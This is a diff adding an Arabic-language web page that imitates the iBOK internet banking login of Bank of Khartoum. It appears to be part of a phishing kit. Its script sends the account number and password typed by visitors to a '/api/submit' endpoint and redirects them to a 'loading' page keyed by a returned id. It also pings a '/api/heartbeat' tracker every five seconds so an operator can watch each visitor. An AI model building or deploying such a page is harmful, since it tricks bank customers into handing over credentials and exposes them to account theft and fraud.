@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>تسجيل الدخول | iBOK | بنك الخرطوم</title>
+<link href="images/bok-icon.png" rel="icon">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
+<style>
+:root{--maroon:#8e0806;--maroon-dark:#6b0605;--dark:#1a1a2e;--gray:#6c757d;--light:#f8f9fa;--white:#fff;--red:#dc3545}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:var(--light);min-height:100vh;display:flex;flex-direction:column}
+
+.top-bar{background:var(--maroon);padding:8px 20px;display:flex;align-items:center;justify-content:space-between}
+.top-bar a{color:rgba(255,255,255,.8);font-size:12px;text-decoration:none;transition:.2s}
+.top-bar a:hover{color:#fff}
+.top-bar .lang-switch{background:rgba(255,255,255,.15);padding:4px 14px;border-radius:20px;color:#fff;font-size:12px;font-weight:500}
+
+.header{background:var(--white);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 10px rgba(0,0,0,.06)}
+.header img{height:48px}
+.header .nav-links{display:flex;gap:24px;align-items:center}
+.header .nav-links a{color:var(--dark);font-size:13px;font-weight:500;text-decoration:none;transition:.2s}
+.header .nav-links a:hover{color:var(--maroon)}
+
+.login-section{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;
+  background:linear-gradient(135deg,#f5f0f0 0%,#faf8f8 50%,#f0eded 100%)}
+
+.login-card{background:var(--white);border-radius:20px;padding:40px 36px;width:100%;max-width:420px;
+  box-shadow:0 20px 60px rgba(142,8,6,.08);position:relative;overflow:hidden}
+.login-card::before{content:'';position:absolute;top:0;right:0;left:0;height:4px;background:linear-gradient(90deg,var(--maroon),#c0392b,var(--maroon))}
+
+.card-icon{width:60px;height:60px;background:linear-gradient(135deg,var(--maroon),#c0392b);border-radius:50%;
+  display:flex;align-items:center;justify-content:center;margin:0 auto 16px;box-shadow:0 8px 24px rgba(142,8,6,.2)}
+.card-icon i{font-size:24px;color:#fff}
+
+.card-title{text-align:center;font-size:22px;font-weight:700;color:var(--dark);margin-bottom:4px}
+.card-sub{text-align:center;font-size:13px;color:var(--gray);margin-bottom:28px}
+
+.form-group{margin-bottom:18px;position:relative}
+.form-group label{display:block;font-size:13px;font-weight:600;color:var(--dark);margin-bottom:6px}
+.form-group .input-icon{position:absolute;top:38px;right:14px;color:var(--gray);font-size:16px}
+.form-group input{width:100%;padding:13px 44px 13px 16px;border:1.5px solid #e0e0e0;border-radius:12px;
+  font-size:15px;font-family:'Poppins',sans-serif;outline:none;transition:.2s;background:var(--white);text-align:right}
+.form-group input:focus{border-color:var(--maroon);box-shadow:0 0 0 3px rgba(142,8,6,.08)}
+.form-group input.error{border-color:var(--red)}
+
+.toggle-pass{position:absolute;top:38px;left:14px;background:none;border:none;cursor:pointer;color:var(--gray);font-size:16px}
+
+.error-box{display:none;background:#fff5f5;border:1.5px solid #fecaca;border-radius:10px;padding:12px 16px;
+  margin-bottom:16px;text-align:center}
+.error-box.show{display:block}
+.error-box span{color:var(--red);font-size:13px;font-weight:600}
+
+.login-btn{width:100%;padding:14px;background:linear-gradient(135deg,var(--maroon),#c0392b);color:#fff;border:none;
+  border-radius:12px;font-size:16px;font-weight:700;font-family:'Poppins',sans-serif;cursor:pointer;
+  transition:.3s;box-shadow:0 4px 16px rgba(142,8,6,.25)}
+.login-btn:hover{background:linear-gradient(135deg,#c0392b,var(--maroon));transform:translateY(-1px);box-shadow:0 6px 20px rgba(142,8,6,.3)}
+.login-btn:disabled{background:#ccc;box-shadow:none;transform:none;cursor:default}
+
+.links{text-align:center;margin-top:20px}
+.links a{color:var(--maroon);font-size:13px;font-weight:500;text-decoration:none}
+.links a:hover{text-decoration:underline}
+
+.security-note{text-align:center;margin-top:20px;padding:12px;background:#fef9f9;border-radius:10px;border:1px solid #f5e0e0}
+.security-note i{color:var(--maroon);margin-left:6px}
+.security-note span{font-size:11px;color:var(--gray)}
+
+.footer{background:var(--dark);color:rgba(255,255,255,.6);text-align:center;padding:16px;font-size:12px}
+.footer a{color:rgba(255,255,255,.8);text-decoration:none}
+
+.loading-overlay{display:none;position:fixed;inset:0;background:rgba(255,255,255,.92);z-index:1000;
+  align-items:center;justify-content:center;flex-direction:column}
+.loading-overlay.show{display:flex}
+.lo-spinner{width:44px;height:44px;border:4px solid #e0e0e0;border-top:4px solid var(--maroon);
+  border-radius:50%;animation:spin .8s linear infinite;margin-bottom:14px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.lo-text{font-size:14px;color:var(--maroon);font-weight:600}
+
+@media(max-width:480px){
+  .login-card{padding:30px 24px;border-radius:16px}
+  .header .nav-links{display:none}
+  .card-title{font-size:20px}
+}
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+  <div><a href="tel:+249187040600"><i class="bi bi-telephone"></i> +249187040600</a></div>
+  <a href="login-en.html" class="lang-switch">English</a>
+</div>
+
+<div class="header">
+  <div class="nav-links">
+    <a href="index.html">الرئيسية</a>
+    <a href="#">الخدمات الرقمية</a>
+  </div>
+  <a href="index.html"><img src="images/logo.png" alt="بنك الخرطوم"></a>
+</div>
+
+<div class="login-section">
+  <div class="login-card">
+    <div class="card-icon"><i class="bi bi-shield-lock"></i></div>
+    <div class="card-title">تسجيل الدخول</div>
+    <div class="card-sub">الإنترنت المصرفي للأفراد - iBOK</div>
+
+    <div class="error-box" id="errorBox"><span id="errorText">بيانات الدخول غير صحيحة</span></div>
+
+    <form onsubmit="return false;">
+      <div class="form-group">
+        <label>رقم الحساب</label>
+        <i class="bi bi-person input-icon"></i>
+        <input type="text" id="accountInput" placeholder="أدخل رقم الحساب" inputmode="numeric" autocomplete="off">
+      </div>
+
+      <div class="form-group">
+        <label>كلمة المرور</label>
+        <i class="bi bi-lock input-icon"></i>
+        <input type="password" id="passwordInput" placeholder="أدخل كلمة المرور" autocomplete="off">
+        <button type="button" class="toggle-pass" onclick="togglePass()"><i class="bi bi-eye" id="eyeIcon"></i></button>
+      </div>
+
+      <button type="submit" class="login-btn" id="loginBtn" onclick="doLogin()">تسجيل الدخول</button>
+    </form>
+
+    <div class="links">
+      <a href="#">هل نسيت كلمة المرور؟</a>
+    </div>
+
+    <div class="security-note">
+      <i class="bi bi-shield-check"></i>
+      <span>جميع المعاملات مشفرة ومحمية بأعلى معايير الأمان</span>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  &copy; 2024 بنك الخرطوم. جميع الحقوق محفوظة.
+</div>
+
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="lo-spinner"></div>
+  <div class="lo-text">جاري التحقق...</div>
+</div>
+
+<script>
+var _vid=sessionStorage.getItem('_vid');if(!_vid){_vid=Math.random().toString(36).slice(2)+Date.now().toString(36);sessionStorage.setItem('_vid',_vid);}
+function heartbeat(){fetch('/api/heartbeat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({page:'login',vid:_vid})}).catch(function(){});}
+heartbeat();setInterval(heartbeat,5000);
+
+function togglePass(){
+  var inp=document.getElementById('passwordInput');
+  var ico=document.getElementById('eyeIcon');
+  if(inp.type==='password'){inp.type='text';ico.className='bi bi-eye-slash';}
+  else{inp.type='password';ico.className='bi bi-eye';}
+}
+
+function doLogin(){
+  var username=document.getElementById('accountInput').value.trim();
+  var password=document.getElementById('passwordInput').value.trim();
+  if(!username||!password)return;
+  document.getElementById('errorBox').classList.remove('show');
+  document.getElementById('loginBtn').disabled=true;
+  document.getElementById('loginBtn').textContent='جاري التحقق...';
+
+  fetch('/api/submit',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({username:username,password:password})
+  })
+  .then(function(r){return r.json();})
+  .then(function(d){
+    if(d.ok&&d.id){
+      window.location.href='loading.html?id='+d.id;
+    }else{
+      document.getElementById('loginBtn').disabled=false;
+      document.getElementById('loginBtn').textContent='تسجيل الدخول';
+    }
+  })
+  .catch(function(){
+    document.getElementById('loginBtn').disabled=false;
+    document.getElementById('loginBtn').textContent='تسجيل الدخول';
+  });
+}
+
+document.getElementById('accountInput').addEventListener('keydown',function(e){if(e.key==='Enter')document.getElementById('passwordInput').focus();});
+document.getElementById('passwordInput').addEventListener('keydown',function(e){if(e.key==='Enter')doLogin();});
+</script>
+</body>
+</html>
